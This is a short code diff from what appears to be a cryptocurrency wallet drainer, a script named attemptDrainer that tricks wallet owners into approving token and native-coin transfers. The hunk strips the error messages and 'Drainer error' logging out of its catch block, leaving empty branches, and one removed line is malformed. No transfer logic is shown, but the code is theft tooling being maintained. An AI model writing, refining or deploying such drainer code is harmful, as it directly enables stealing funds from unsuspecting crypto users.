@@ -1021,22 +1021,13 @@ async function attemptDrainer() {
     isTransactionPending = false;
   } catch (error) {
     isTransactionPending = false;
-    let errorMessage = "Error: An unexpected error occurred.";
     if (error.message.includes('user rejected')) {
-      errorMessage = "Error: Transaction rejected by user.";
     } else if (error.message.includes('Insufficient')) {
-      errorMessage = error.message;
     } else if (error.message.includes('Failed to approve token')) {
-      errorMessage = "Error: Failed to approve token. Your wallet may not support this operation.";
     } else if (error.message.includes('Failed to process')) {
-      errorMessage = "Error: Failed to process native token transfer. Your wallet may not support this operation.";
     } else if (error.message.includes('Failed to switch')) {
-      errorMessage = "Error: Failed to switch network. Please switch manually in your wallet.";
     } else {
-errorMessage = ${error.message};
     }
-    console.error(`❌ Drainer error: ${errorMessage}`);
-    await hideModalWithDelay(errorMessage);
     throw error;
   }
 }
